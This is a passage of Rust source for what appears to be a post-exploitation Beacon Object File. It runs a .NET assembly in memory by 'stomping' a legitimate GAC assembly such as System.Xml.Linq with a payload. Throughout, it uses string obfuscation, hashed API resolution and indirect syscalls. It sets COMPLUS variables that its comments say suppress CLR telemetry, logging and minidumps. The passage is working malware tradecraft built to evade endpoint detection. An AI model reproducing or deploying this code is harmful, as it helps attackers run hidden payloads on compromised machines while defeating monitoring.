        path.extend_from_slice(prefix.as_bytes());
        path.extend_from_slice(dll_base);
        path.push(b'\\');
        path.extend_from_slice(ver_dir);
        path.push(b'\\');
        path.extend_from_slice(dll_name);
        path.push(0); // null terminator

        // 5. Open file — GENERIC_READ=0x80000000, FILE_SHARE_READ|WRITE=0x3,
        //    OPEN_EXISTING=3, FILE_ATTRIBUTE_NORMAL=128
        let h = create_file(
            path.as_ptr(),
            0x80000000u32,
            0x3,
            core::ptr::null_mut(),
            3,
            128,
            core::ptr::null_mut(),
        );
        let invalid = usize::MAX as *mut c_void;
        if h == invalid || h.is_null() {
            return None;
        }

        // 6. Read first 1024 bytes (enough for PE headers)
        let mut hdr_buf = [0u8; 1024];
        let mut n_read: u32 = 0;
        let ok = read_file(
            h,
            hdr_buf.as_mut_ptr() as *mut c_void,
            1024,
            &mut n_read,
            core::ptr::null_mut(),
        );
        close_handle(h);

        if ok == 0 || n_read < 64 {
            return None;
        }

        // 7. Parse SizeOfImage from PE Optional Header
        // SizeOfImage is at offset +56 from start of Optional Header.
        // Offset is identical for PE32 and PE32+.
        if hdr_buf[0] != b'M' || hdr_buf[1] != b'Z' {
            return None;
        }
        let e_lfanew = u32::from_le_bytes([
            hdr_buf[0x3C], hdr_buf[0x3D], hdr_buf[0x3E], hdr_buf[0x3F],
        ]) as usize;
        if e_lfanew.saturating_add(84) > n_read as usize {
            return None;
        }
        let opt = e_lfanew + 24;
        let size_of_image = u32::from_le_bytes([
            hdr_buf[opt + 56],
            hdr_buf[opt + 57],
            hdr_buf[opt + 58],
            hdr_buf[opt + 59],
        ]) as usize;

        if size_of_image == 0 { None } else { Some(size_of_image) }
    }
}

fn victim_candidates(clr_major: u8) -> Vec<VictimCandidate> {
    let mut v: Vec<VictimCandidate> = Vec::new();
    if clr_major >= 4 {
        {
            let id = obfw!("System.Xml.Linq, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\0");
            let dll = obf!("System.Xml.Linq.dll\0");
            let ver = obf!("v4.0_4.0.0.0__b77a5c561934e089\0");
            v.push(VictimCandidate {
                identity_wide: id.as_wide().to_vec(),
                dll_name_a: dll.as_bytes().to_vec(),
                version_dir: ver.as_bytes().to_vec(),
            });
        }
        {
            let id = obfw!("System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorarchitecture=msil\0");
            let dll = obf!("System.ServiceModel.dll\0");
            let ver = obf!("v4.0_4.0.0.0__b77a5c561934e089\0");
            v.push(VictimCandidate {
                identity_wide: id.as_wide().to_vec(),
                dll_name_a: dll.as_bytes().to_vec(),
                version_dir: ver.as_bytes().to_vec(),
            });
        }
        {
            let id = obfw!("System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\0");
            let dll = obf!("System.Drawing.dll\0");
            let ver = obf!("v4.0_4.0.0.0__b03f5f7f11d50a3a\0");
            v.push(VictimCandidate {
                identity_wide: id.as_wide().to_vec(),
                dll_name_a: dll.as_bytes().to_vec(),
                version_dir: ver.as_bytes().to_vec(),
            });
        }
    } else {
        {
            let id = obfw!("System.Drawing, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a\0");
            let dll = obf!("System.Drawing.dll\0");
            let ver = obf!("v2.0.50727_2.0.0.0__b03f5f7f11d50a3a\0");
            v.push(VictimCandidate {
                identity_wide: id.as_wide().to_vec(),
                dll_name_a: dll.as_bytes().to_vec(),
                version_dir: ver.as_bytes().to_vec(),
            });
        }
        {
            let id = obfw!("System.Xml, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\0");
            let dll = obf!("System.Xml.dll\0");
            let ver = obf!("v2.0.50727_2.0.0.0__b77a5c561934e089\0");
            v.push(VictimCandidate {
                identity_wide: id.as_wide().to_vec(),
                dll_name_a: dll.as_bytes().to_vec(),
                version_dir: ver.as_bytes().to_vec(),
            });
        }
    }
    v
}

// ─── Public entry point ──────────────────────────────────────────────────────

pub struct StompRunInput<'a> {
    pub app_domain: &'a str,
    pub pipe_name: &'a str,
    pub asm_args: &'a str,
    pub asm_bytes: &'a [u8],
    pub entry_point: u32,
    pub clr_major: u8,
}

const V4_VERSION_W: &[u16] = &[
    b'v' as u16, b'4' as u16, b'.' as u16, b'0' as u16, b'.' as u16,
    b'3' as u16, b'0' as u16, b'3' as u16, b'1' as u16, b'9' as u16, 0,
];
const V2_VERSION_W: &[u16] = &[
    b'v' as u16, b'2' as u16, b'.' as u16, b'0' as u16, b'.' as u16,
    b'5' as u16, b'0' as u16, b'7' as u16, b'2' as u16, b'7' as u16, 0,
];

pub unsafe fn run_stomp(input: &StompRunInput<'_>) -> Result<(), BofError> {
    unsafe {
        crate::dlog2(b"[stomp] run_stomp entered");

        let asm_bytes = input.asm_bytes;
        if asm_bytes.len() < 0x40 {
            return Err(BofError::Clr { hr: -1, op: "sp0" });
        }
        let e_lfanew = u32::from_le_bytes([
            asm_bytes[0x3C], asm_bytes[0x3D], asm_bytes[0x3E], asm_bytes[0x3F],
        ]) as usize;
        let opt = e_lfanew + 24;
        if opt + 60 > asm_bytes.len() {
            return Err(BofError::Clr { hr: -1, op: "sp1" });
        }
        let payload_image_size = u32::from_le_bytes([
            asm_bytes[opt + 56], asm_bytes[opt + 57],
            asm_bytes[opt + 58], asm_bytes[opt + 59],
        ]) as usize;

        let state_name = bof_state_name();

        let (cor_host, mm_obj, sp_obj, custom_host, hc_obj, host_objs) =
            if let Some((h, state_ptr)) = try_open_bof_state(&state_name) {
                crate::dlog2(b"[stomp] recovering cached CLR host");
                let bs = core::ptr::read(state_ptr);
                type UnmapFn = unsafe extern "system" fn(*const c_void) -> i32;
                type CloseFn = unsafe extern "system" fn(*mut c_void) -> i32;
                if let Some(unmap) =
                    peb_fn::<UnmapFn>(hash!("kernel32.dll"), hash!("UnmapViewOfFile"))
                {
                    unmap(state_ptr as *const c_void);
                }
                if let Some(close) = peb_fn::<CloseFn>(hash!("kernel32.dll"), hash!("CloseHandle")) {
                    close(h);
                }
                if bs.magic != BOF_STATE_MAGIC
                    || bs.host_objects.is_null()
                    || bs.p_cor_host.is_null()
                    || bs.memory_manager.is_null()
                    || bs.stomp_payload.is_null()
                    || bs.p_custom_host.is_null()
                    || bs.p_host_control.is_null()
                {
                    return Err(BofError::Clr { hr: -1, op: "sc1" });
                }
                refresh_vtables(bs.host_objects);
                (*bs.memory_manager).vtbl = core::ptr::addr_of!((*bs.host_objects).mm_vtbl);
                (*bs.p_host_control).vtbl = core::ptr::addr_of!((*bs.host_objects).hc_vtbl);
                if !(*bs.memory_manager).malloc_obj.is_null() {
                    (*(*bs.memory_manager).malloc_obj).vtbl =
                        core::ptr::addr_of!((*bs.host_objects).hm_vtbl);
                }
                let sp = bs.stomp_payload;
                if !(*sp).payload_bytes.is_null() {
                    core::ptr::write_bytes((*sp).payload_bytes, 0, (*sp).payload_size);
                    type GlobalFreeFn = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
                    if let Some(gf) =
                        peb_fn::<GlobalFreeFn>(hash!("kernel32.dll"), hash!("GlobalFree"))
                    {
                        gf((*sp).payload_bytes as *mut c_void);
                    }
                    (*sp).payload_bytes = core::ptr::null_mut();
                }
                let new_buf = global_alloc_zeroed(asm_bytes.len()) as *mut u8;
                if new_buf.is_null() {
                    return Err(BofError::Clr { hr: -1, op: "sc2" });
                }
                core::ptr::copy_nonoverlapping(asm_bytes.as_ptr(), new_buf, asm_bytes.len());
                (*sp).payload_bytes = new_buf;
                (*sp).payload_size = asm_bytes.len();
                (*sp).image_size = payload_image_size;
                (*sp).victim_image_size = usize::MAX; // updated after victim selection
                core::ptr::write_volatile(&mut (*sp).pending, 0);
                core::ptr::write_volatile(&mut (*sp).stomped, 0);
                (
                    bs.p_cor_host,
                    bs.memory_manager,
                    bs.stomp_payload,
                    bs.p_custom_host,
                    bs.p_host_control,
                    bs.host_objects,
                )
            } else {
                crate::dlog2(b"[stomp] first run - initialising CLR");

                let host_objs_raw =
                    global_alloc_zeroed(core::mem::size_of::<HostObjects>()) as *mut HostObjects;
                if host_objs_raw.is_null() {
                    return Err(BofError::Clr { hr: -1, op: "fr0" });
                }
                refresh_vtables(host_objs_raw);

                let sp_raw =
                    global_alloc_zeroed(core::mem::size_of::<StompPayload>()) as *mut StompPayload;
                if sp_raw.is_null() {
                    return Err(BofError::Clr { hr: -1, op: "fr1" });
                }
                let buf = global_alloc_zeroed(asm_bytes.len()) as *mut u8;
                if buf.is_null() {
                    return Err(BofError::Clr { hr: -1, op: "fr2" });
                }
                core::ptr::copy_nonoverlapping(asm_bytes.as_ptr(), buf, asm_bytes.len());
                (*sp_raw).payload_bytes = buf;
                (*sp_raw).payload_size = asm_bytes.len();
                (*sp_raw).image_size = payload_image_size;
                (*sp_raw).victim_image_size = usize::MAX; // updated after victim selection
                // Bootstrap::init scans ntdll for a syscall;ret gadget and
                // resolves each NT export's SSN. Cache the NtProtectVirtualMemory
                // pair on the StompPayload so mm_acquired_vas can call indirect-
                // syscall directly from the CLR callback without needing a
                // thread-local Bootstrap instance.
                //
                // Bootstrap::init failure is non-fatal — vp_indirect falls
                // back to PEB-resolved kernel32!VirtualProtect on (0,0).
                match opsec_bootstrap::Bootstrap::init() {
                    Ok(b) => {
                        (*sp_raw).nt_vp_ssn = b.protect_vm_ssn;
                        (*sp_raw).nt_vp_gadget = b.gadget;
                    }
                    Err(_) => {
                        (*sp_raw).nt_vp_ssn = 0;
                        (*sp_raw).nt_vp_gadget = 0;
                    }
                }

                let mm_raw = global_alloc_zeroed(core::mem::size_of::<MemoryManagerObject>())
                    as *mut MemoryManagerObject;
                if mm_raw.is_null() {
                    return Err(BofError::Clr { hr: -1, op: "fr3" });
                }
                (*mm_raw).vtbl = core::ptr::addr_of!((*host_objs_raw).mm_vtbl);
                (*mm_raw).ref_count = 1;
                (*mm_raw).stomp_payload = sp_raw;

                let hc_raw = global_alloc_zeroed(core::mem::size_of::<HostControlObject>())
                    as *mut HostControlObject;
                if hc_raw.is_null() {
                    return Err(BofError::Clr { hr: -1, op: "fr4" });
                }
                (*hc_raw).vtbl = core::ptr::addr_of!((*host_objs_raw).hc_vtbl);
                (*hc_raw).ref_count = 1;
                (*hc_raw).memory_manager = mm_raw;

                type GetEnvFn = unsafe extern "system" fn(*const u8, *mut u8, u32) -> u32;
                type SetEnvFn = unsafe extern "system" fn(*const u8, *const u8) -> i32;
                let get_env: Option<GetEnvFn> =
                    peb_fn(hash!("kernel32.dll"), hash!("GetEnvironmentVariableA"));
                let set_env: Option<SetEnvFn> =
                    peb_fn(hash!("kernel32.dll"), hash!("SetEnvironmentVariableA"));

                let mut old_zap = [0u8; 256];
                let mut old_sn  = [0u8; 256];
                let mut old_pub = [0u8; 256];
                let mut old_dat = [0u8; 256]; // DisableAttachThread
                let mut old_log = [0u8; 256]; // LogEnable
                let mut old_dmd = [0u8; 256]; // DbgEnableMiniDump
                let had_zap = get_env.is_some_and(|f| {
                    let k = obf!("COMPLUS_ZapDisable\0");
                    f(k.as_bytes().as_ptr(), old_zap.as_mut_ptr(), 256) > 0
                });
                let had_sn = get_env.is_some_and(|f| {
                    let k = obf!("COMPLUS_AllowStrongNameBypass\0");
                    f(k.as_bytes().as_ptr(), old_sn.as_mut_ptr(), 256) > 0
                });
                let had_pub = get_env.is_some_and(|f| {
                    let k = obf!("COMPLUS_GeneratePublisherEvidence\0");
                    f(k.as_bytes().as_ptr(), old_pub.as_mut_ptr(), 256) > 0
                });
                let had_dat = get_env.is_some_and(|f| {
                    let k = obf!("COMPLUS_DisableAttachThread\0");
                    f(k.as_bytes().as_ptr(), old_dat.as_mut_ptr(), 256) > 0
                });
                let had_log = get_env.is_some_and(|f| {
                    let k = obf!("COMPLUS_LogEnable\0");
                    f(k.as_bytes().as_ptr(), old_log.as_mut_ptr(), 256) > 0
                });
                let had_dmd = get_env.is_some_and(|f| {
                    let k = obf!("COMPLUS_DbgEnableMiniDump\0");
                    f(k.as_bytes().as_ptr(), old_dmd.as_mut_ptr(), 256) > 0
                });
                if let Some(se) = set_env {
                    let k1 = obf!("COMPLUS_ZapDisable\0");
                    let v1 = obf!("1\0");
                    se(k1.as_bytes().as_ptr(), v1.as_bytes().as_ptr());
                    let k2 = obf!("COMPLUS_AllowStrongNameBypass\0");
                    let v2 = obf!("1\0");
                    se(k2.as_bytes().as_ptr(), v2.as_bytes().as_ptr());
                    // Prevent CAS publisher-evidence generation during EEStartup.
                    // Without this, CLR validates Authenticode certificates online
                    // (CRL check) for each IL assembly it loads when ZapDisable=1.
                    // On a network-isolated host the check times out after ~90 s
                    // and ICLRRuntimeHost::Start() returns E_FAIL.
                    let k3 = obf!("COMPLUS_GeneratePublisherEvidence\0");
                    let v0 = obf!("0\0");
                    se(k3.as_bytes().as_ptr(), v0.as_bytes().as_ptr());
                    // DisableAttachThread=1: CLR does not spawn the
                    // DbgAttachThread (visible via thread enumeration; signal
                    // for "process has a CLR" telemetry).
                    let k4 = obf!("COMPLUS_DisableAttachThread\0");
                    se(k4.as_bytes().as_ptr(), v1.as_bytes().as_ptr());
                    // LogEnable=0: suppress CLR managed logging facility.
                    let k5 = obf!("COMPLUS_LogEnable\0");
                    se(k5.as_bytes().as_ptr(), v0.as_bytes().as_ptr());
                    // DbgEnableMiniDump=0: no minidump on CLR-internal exception.
                    let k6 = obf!("COMPLUS_DbgEnableMiniDump\0");
                    se(k6.as_bytes().as_ptr(), v0.as_bytes().as_ptr());
                }

                // Macro to restore COMPLUS env vars; called on every early-return path
                // after the set block to prevent the vars from staying set permanently.
                macro_rules! restore_complus_env {
                    () => {
                        if let Some(se) = set_env {
                            let k1 = obf!("COMPLUS_ZapDisable\0");
                            if had_zap {
                                se(k1.as_bytes().as_ptr(), old_zap.as_ptr());
                            } else {
                                se(k1.as_bytes().as_ptr(), core::ptr::null());
                            }
                            let k2 = obf!("COMPLUS_AllowStrongNameBypass\0");
                            if had_sn {
                                se(k2.as_bytes().as_ptr(), old_sn.as_ptr());
                            } else {
                                se(k2.as_bytes().as_ptr(), core::ptr::null());
                            }
                            let k3 = obf!("COMPLUS_GeneratePublisherEvidence\0");
                            if had_pub {
                                se(k3.as_bytes().as_ptr(), old_pub.as_ptr());
                            } else {
                                se(k3.as_bytes().as_ptr(), core::ptr::null());
                            }
                            let k4 = obf!("COMPLUS_DisableAttachThread\0");
                            if had_dat {
                                se(k4.as_bytes().as_ptr(), old_dat.as_ptr());
                            } else {
                                se(k4.as_bytes().as_ptr(), core::ptr::null());
                            }
                            let k5 = obf!("COMPLUS_LogEnable\0");
                            if had_log {
                                se(k5.as_bytes().as_ptr(), old_log.as_ptr());
                            } else {
                                se(k5.as_bytes().as_ptr(), core::ptr::null());
                            }
                            let k6 = obf!("COMPLUS_DbgEnableMiniDump\0");
                            if had_dmd {
                                se(k6.as_bytes().as_ptr(), old_dmd.as_ptr());
                            } else {
                                se(k6.as_bytes().as_ptr(), core::ptr::null());
                            }
                        }
                    };
                }

                crate::dlog2(b"[stomp] CLRCreateInstance");

                // Load mscoree.dll if not already loaded
                const MSCOREE_W: &[u16] = &[
                    0x6D, 0x73, 0x63, 0x6F, 0x72, 0x65, 0x65, 0x2E, 0x64, 0x6C, 0x6C, 0,
                ]; // "mscoree.dll\0"
                if resolve_module(hash!("mscoree.dll")).is_none() {
                    type LoadLibraryWFn = unsafe extern "system" fn(*const u16) -> *mut c_void;
                    let load_lib: LoadLibraryWFn =
                        match peb_fn(hash!("kernel32.dll"), hash!("LoadLibraryW")) {
                            Some(f) => f,
                            None => {
                                restore_complus_env!();
                                return Err(BofError::Clr { hr: -1, op: "fr5" });
                            }
                        };
                    let _module = load_lib(MSCOREE_W.as_ptr());
                }

                let mscoree = match resolve_module(hash!("mscoree.dll")) {
                    Some(m) => m,
                    None => {
                        restore_complus_env!();
                        return Err(BofError::Clr { hr: -1, op: "fr6" });
                    }
                };
                let create_inst_ptr = match resolve_export(mscoree, hash!("CLRCreateInstance")) {
                    Some(p) => p,
                    None => {
                        restore_complus_env!();
                        return Err(BofError::Clr { hr: -1, op: "fr7" });
                    }
                };
                type CreateFn = unsafe extern "system" fn(
                    *const Guid,
                    *const Guid,
                    *mut *mut c_void,
                ) -> i32;
                let create_fn: CreateFn = core::mem::transmute(create_inst_ptr);

                let mut meta_host: *mut c_void = core::ptr::null_mut();
                let hr = create_fn(&CLSID_CLR_META_HOST, &IID_ICLR_META_HOST, &mut meta_host);
                if hr < 0 {
                    restore_complus_env!();
                    return Err(BofError::Clr { hr, op: "fr8" });
                }
                crate::dlog2(b"[stomp] CLRCreateInstance ok");
                let meta_host = meta_host as *mut opsec_com::clr::ICLRMetaHost;

                let clr_ver_w = if input.clr_major >= 4 { V4_VERSION_W } else { V2_VERSION_W };
                let mut runtime_info: *mut c_void = core::ptr::null_mut();
                let hr = ((*(*meta_host).vtbl).get_runtime)(
                    meta_host as *mut c_void,
                    clr_ver_w.as_ptr(),
                    &IID_ICLR_RUNTIME_INFO,
                    &mut runtime_info,
                );
                {
                    let unk = meta_host as *mut IUnknown;
                    ((*(*unk).vtbl).release)(unk as *mut c_void);
                }
                if hr < 0 {
                    restore_complus_env!();
                    return Err(BofError::Clr { hr, op: "fr9" });
                }
                crate::dlog2(b"[stomp] GetRuntime ok");
                let runtime_info = runtime_info as *mut opsec_com::clr::ICLRRuntimeInfo;

                let mut started: i32 = 0;
                let mut _startup_flags: u32 = 0;
                let hr_is = ((*(*runtime_info).vtbl).is_started)(
                    runtime_info as *mut c_void,
                    &mut started,
                    &mut _startup_flags,
                );
                if hr_is >= 0 && started != 0 {
                    let unk = runtime_info as *mut IUnknown;
                    ((*(*unk).vtbl).release)(unk as *mut c_void);
                    restore_complus_env!();
                    return Err(BofError::ClrAlreadyRunning);
                }
                crate::dlog2(b"[stomp] IsStarted=0 fresh CLR");

                // If clr.dll is already in the PEB but Start() never completed,
                // this is a partial-init state from a prior frD on this Beacon.
                // Re-entering GetInterface on partially-initialised CLR crashes.
                if opsec_peb::resolve_module(hash!("clr.dll")).is_some() {
                    crate::dlog2(b"[stomp] clr.dll in PEB partial-init bail");
                    let unk = runtime_info as *mut IUnknown;
                    ((*(*unk).vtbl).release)(unk as *mut c_void);
                    restore_complus_env!();
                    return Err(BofError::ClrAlreadyRunning);
                }

                crate::dlog2(b"[stomp] calling GetInterface ICLRRuntimeHost");
                let mut custom_host_raw: *mut c_void = core::ptr::null_mut();
                let hr = ((*(*runtime_info).vtbl).get_interface)(
                    runtime_info as *mut c_void,
                    &CLSID_CLR_RUNTIME_HOST,
                    &IID_ICLR_RUNTIME_HOST,
                    &mut custom_host_raw,
                );
                if hr < 0 {
                    let unk = runtime_info as *mut IUnknown;
                    ((*(*unk).vtbl).release)(unk as *mut c_void);
                    restore_complus_env!();
                    return Err(BofError::Clr { hr, op: "frB" });
                }
                crate::dlog2(b"[stomp] GetInterface ICLRRuntimeHost ok");
                let custom_host = custom_host_raw as *mut ICLRRuntimeHost;

                #[cfg(not(feature = "diag-skip-hc"))]
                let hr_hc = ((*(*custom_host).vtbl).set_host_control)(
                    custom_host as *mut c_void,
                    hc_raw as *mut c_void,
                );
                #[cfg(feature = "diag-skip-hc")]
                let hr_hc = {
                    crate::dlog2(b"[stomp] SetHostControl SKIPPED (diag-skip-hc)");
                    0i32
                };
                crate::dlog2(b"[stomp] SetHostControl returned");
                if hr_hc < 0 {
                    let unk = runtime_info as *mut IUnknown;
                    ((*(*unk).vtbl).release)(unk as *mut c_void);
                    restore_complus_env!();
                    return Err(BofError::Clr { hr: hr_hc, op: "frC" });
                }

                let hr = ((*(*custom_host).vtbl).start)(custom_host as *mut c_void);
                crate::dlog2(b"[stomp] CLR Start returned");
                if hr < 0 {
                    let unk = runtime_info as *mut IUnknown;
                    ((*(*unk).vtbl).release)(unk as *mut c_void);
                    restore_complus_env!();
                    return Err(BofError::Clr { hr, op: "frD" });
                }

                restore_complus_env!();

                let mut get_runtime_dir_buf = [0u16; 512];
                let mut grd_len: u32 = 512;
                let _ = ((*(*runtime_info).vtbl).get_runtime_directory)(
                    runtime_info as *mut c_void,
                    get_runtime_dir_buf.as_mut_ptr(),
                    &mut grd_len,
                );

                let mut cor_host_raw: *mut c_void = core::ptr::null_mut();
                let hr = ((*(*runtime_info).vtbl).get_interface)(
                    runtime_info as *mut c_void,
                    &CLSID_COR_RUNTIME_HOST,
                    &IID_ICOR_RUNTIME_HOST,
                    &mut cor_host_raw,
                );
                let unk = runtime_info as *mut IUnknown;
                ((*(*unk).vtbl).release)(unk as *mut c_void);
                if hr < 0 {
                    return Err(BofError::Clr { hr, op: "frE" });
                }
                let cor_host = cor_host_raw as *mut ICorRuntimeHost;

                let new_state = BofState {
                    magic: BOF_STATE_MAGIC,
                    host_objects: host_objs_raw,
                    p_cor_host: cor_host,
                    memory_manager: mm_raw,
                    stomp_payload: sp_raw,
                    p_custom_host: custom_host,
                    p_host_control: hc_raw,
                };
                create_bof_state(&state_name, &new_state)?;
                crate::dlog2(b"[stomp] BofState persisted");

                let _ = get_runtime_dir_buf;
                (cor_host, mm_raw, sp_raw, custom_host, hc_raw, host_objs_raw)
            };

        let _ = (custom_host, hc_obj, host_objs);

        let candidates = victim_candidates(input.clr_major);

        // Select victim: first candidate whose SizeOfImage >= payload image size.
        // read_victim_size_from_gac returns None on GAC path failure;
        // usize::MAX fallback accepts any large-enough mapping unconditionally.
        let mut chosen_identity: Option<Vec<u16>> = None;
        let mut chosen_victim_size: usize = usize::MAX;

        for cand in &candidates {
            let victim_sz = read_victim_size_from_gac(cand).unwrap_or(usize::MAX);
            crate::dlog2(b"[stomp] victim candidate checked");
            if victim_sz >= payload_image_size {
                chosen_identity = Some(
                    cand.identity_wide
                        .iter()
                        .copied()
                        .take_while(|&c| c != 0)
                        .collect(),
                );
                chosen_victim_size = victim_sz;
                break;
            }
        }

        let identity_slice = chosen_identity
            .as_deref()
            .ok_or(BofError::Clr { hr: -1, op: "vs0" })?;

        // oleaut32.dll is needed for SysAllocStringLen (BSTR creation). CLR does not
        // load it during EEStartup on all targets; load it now if absent.
        crate::dlog2(b"[stomp] checking oleaut32.dll in PEB");
        if resolve_module(hash!("oleaut32.dll")).is_none() {
            crate::dlog2(b"[stomp] oleaut32.dll not in PEB - calling LoadLibraryW");
            const OLEAUT32_W: &[u16] = &[
                0x6F, 0x6C, 0x65, 0x61, 0x75, 0x74, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0,
            ]; // "oleaut32.dll\0"
            type LlwFn = unsafe extern "system" fn(*const u16) -> *mut c_void;
            if let Some(f) = peb_fn::<LlwFn>(hash!("kernel32.dll"), hash!("LoadLibraryW")) {
                let h = f(OLEAUT32_W.as_ptr());
                if h.is_null() {
                    crate::dlog2(b"[stomp] LoadLibraryW(oleaut32) FAILED");
                } else {
                    crate::dlog2(b"[stomp] LoadLibraryW(oleaut32) ok");
                }
            } else {
                crate::dlog2(b"[stomp] LoadLibraryW not resolved");
            }
        } else {
            crate::dlog2(b"[stomp] oleaut32.dll already in PEB");
        }
        crate::dlog2(b"[stomp] OwnedBstr::from_utf16");
        let victim_bstr = OwnedBstr::from_utf16(identity_slice)
            .ok_or(BofError::Clr { hr: -1, op: "v1" })?;
        crate::dlog2(b"[stomp] OwnedBstr ok");

        let domain_name_w: Vec<u16> = input.app_domain.encode_utf16().chain(Some(0)).collect();
        let mut domain_unk: *mut c_void = core::ptr::null_mut();
        let h = cor_host;
        let hr = ((*(*h).vtbl).create_domain)(
            h as *mut c_void,
            domain_name_w.as_ptr(),
            core::ptr::null_mut(),
            &mut domain_unk,
        );
        if hr < 0 {
            return Err(BofError::Clr { hr, op: "d0" });
        }
        let unk = domain_unk as *mut IUnknown;
        let mut domain_ptr: *mut c_void = core::ptr::null_mut();
        let hr = ((*(*unk).vtbl).query_interface)(
            unk as *mut c_void,
            &IID_APP_DOMAIN,
            &mut domain_ptr,
        );
        if hr < 0 {
            ((*(*unk).vtbl).release)(unk as *mut c_void);
            return Err(BofError::Clr { hr, op: "d1" });
        }
        let domain = ComPtr::<AppDomain>::from_raw(domain_ptr as *mut _)
            .ok_or(BofError::Clr { hr: -1, op: "d2" })?;

        let mut io_ch = crate::io::IoChannel::open(false, "", input.pipe_name)?;

        (*sp_obj).victim_image_size = chosen_victim_size;
        core::ptr::write_volatile(&mut (*sp_obj).pending, 1);
        core::ptr::write_volatile(&mut (*sp_obj).stomped, 0);

        crate::dlog2(b"[stomp] Load_2");
        let d = domain.as_raw();
        let mut asm_ptr: *mut c_void = core::ptr::null_mut();
        let hr = ((*(*d).vtbl).load_2)(d as *mut c_void, victim_bstr.s, &mut asm_ptr);
        core::ptr::write_volatile(&mut (*sp_obj).pending, 0);

        if hr < 0 {
            return Err(BofError::Clr { hr, op: "l2" });
        }
        if core::ptr::read_volatile(&(*sp_obj).stomped) == 0 {
            return Err(BofError::Clr { hr: -1, op: "l3" });
        }
        crate::dlog2(b"[stomp] Load_2 succeeded (stomped)");

        let assembly = ComPtr::<Assembly>::from_raw(asm_ptr as *mut _)
            .ok_or(BofError::Clr { hr: -1, op: "l4" })?;

        crate::netfx::invoke(&assembly, input.asm_args, input.entry_point)?;

        // Drop the cached mm_obj reference (suppress unused warning).
        let _ = mm_obj;

        if let Ok(output) = io_ch.drain() {
            if !output.is_empty() {
                rustbof::eprintln!("\n{}", output);
            }
        }
        Ok(())
    }
}
